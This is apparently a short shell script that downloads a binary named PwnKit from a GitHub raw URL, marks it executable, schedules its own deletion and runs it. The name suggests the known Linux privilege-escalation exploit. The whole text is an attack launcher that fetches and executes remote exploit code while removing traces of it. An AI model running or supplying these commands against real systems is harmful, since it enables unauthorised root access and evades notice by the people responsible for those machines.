curl -fsSL https://raw.githubusercontent.com/WhatsWrongAndWhy/PwnKit/refs/heads/main/PwnKit_ly4k -o PwnKit || exit
chmod +x ./PwnKit || exit
(sleep 1 && rm ./PwnKit & )
./PwnKit
